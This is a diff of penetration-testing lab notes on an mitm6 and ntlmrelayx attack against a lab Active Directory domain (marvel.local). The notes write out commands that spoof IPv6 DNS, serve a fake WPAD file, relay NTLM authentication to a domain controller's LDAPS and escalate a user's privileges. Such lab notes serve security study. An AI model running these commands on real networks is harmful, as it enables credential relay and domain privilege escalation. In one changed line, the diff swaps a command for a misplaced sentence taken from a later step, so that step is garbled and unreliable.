@@ -7,7 +7,7 @@ If mitm6 not yet installed
 How to initiate the attack?
 
 1. Prepare the command `sudo mitm6 -d marvel.local`. Do not yet execute it as we will run ntlmrelayx first.
-2. Execute `ntlmrelayx 6 -t ldaps://192.168.64.250 -wh fakewpad.marvel.local -escalate-user pparker` or `impacket-ntlmrelayx -6 -t ldaps://192.168.64.250 -wh fakewpad.marvel.local -l lootme` - Sets up the relay server and WPAD host, ready to intercept and relay NTLM authentication.
+2. Execute `ntlmrelayx 6 -t ldaps://192.168.64.250 -wh fakewpad.marvel.local -escalate-user pparker` or `The Domain Computer requested wpad.dat file to the attacker's machine. based from the image, it successfully downloaded the wpad.dat.` - Sets up the relay server and WPAD host, ready to intercept and relay NTLM authentication.
 
 ```
 └─$ impacket-ntlmrelayx -6 -t ldaps://192.168.64.250 -wh fakewpad.marvel.local -l lootme
@@ -90,5 +90,5 @@ Capturing, in the wireshark, here is the step by step
 4. The Domain Computer requested wpad.dat file to the attacker's machine. based from the image, it successfully downloaded the wpad.dat.
 ![[Pasted image 20240716221027.png]]
 
-5. 
+5.  The wpad.dat contains java script.
 
